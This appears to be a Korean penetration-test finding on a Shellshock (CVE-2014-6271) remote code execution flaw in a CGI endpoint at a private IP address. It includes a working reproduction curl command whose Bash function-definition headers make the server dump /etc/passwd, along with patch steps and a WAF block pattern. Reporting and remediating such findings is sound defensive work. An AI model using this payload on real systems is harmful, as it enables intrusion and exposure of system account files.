## ShellShock - Remote Code Execution
- **End-Point**: `http://10.64.162.78/cgi-bin/test.cgi/debug.cgi`
- **영향**: 원격 코드 실행(RCE)을 통해 공격자가 시스템 권한을 탈취하거나 데이터를 유출하고, 전체 시스템을 침해할 수 있는 심각한 위협이 발생함.
- **설명**: GNU Bash 4.3 이하 버전에서 환경 변수에 포함된 함수 정의 뒤의 문자열을 부적절하게 처리하는 CVE-2014-6271 취약점으로, Apache mod_cgi 등 Bash를 호출하는 서비스 환경에서 조작된 환경 변수를 통해 임의의 명령을 실행할 수 있음.
- **근거**: HTTP 헤더(Cookie, Referer, User-Agent 등)에 Bash 함수 정의 형식의 페이로드를 삽입하여 `/etc/passwd` 파일 열람을 시도함. 재현 코드: `curl -X 'GET' -d '' -H 'Accept: */*' -H 'Accept-Language: en' -H 'Cookie: () { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ' -H 'Referer: () { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ' -H 'Shellshock: () { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ' -H 'User-Agent: Mozilla/5.0 (CentOS; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0' 'http://10.64.162.78/cgi-bin/test.cgi/debug.cgi'`
- **대응**: 운영체제 제조사에서 제공하는 보안 패치를 적용하여 Bash 버전을 최신 상태로 업데이트함.
- **조치**: `yum update bash` 또는 `apt-get install --only-upgrade bash` 명령어를 사용하여 패치를 수행하고, 웹 방화벽(WAF)에서 `() { :; };` 패턴을 포함한 요청을 차단하도록 설정함.
